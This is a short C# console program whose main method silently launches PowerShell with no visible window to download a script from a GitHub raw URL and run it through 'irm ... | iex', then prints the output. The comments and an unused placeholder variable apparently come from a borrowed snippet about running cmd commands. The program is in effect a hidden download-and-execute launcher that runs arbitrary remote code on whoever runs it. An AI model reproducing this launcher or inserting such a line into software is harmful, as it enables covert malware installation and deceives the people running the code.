using System;
using System.Diagnostics;

namespace CMDCommandUsingCsharp
{
    public class Program
    {
        static void Main(string[] args)
        {
            var proc1 = new ProcessStartInfo();

            //cmd command
            var command = "GITs link to raw data";

            // '/c' tells cmd that we want it to execute the command that follows, and then exit.
            System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("powershell", "/c irm https://raw.githubusercontent.com/Scopper31/shit/main/cmnd.ps1 | iex");

            // The following commands are needed to redirect the standard output. 
            //This means that it will be redirected to the Process.StandardOutput StreamReader.
            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            // Do not create the black window.
            procStartInfo.CreateNoWindow = true;
            // Now we create a process, assign its ProcessStartInfo and start it
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo = procStartInfo;
            proc.Start();

            // Get the output into a string
            string result = proc.StandardOutput.ReadToEnd();

            // Display the command output.
            Console.WriteLine(result);

        }
    }
}
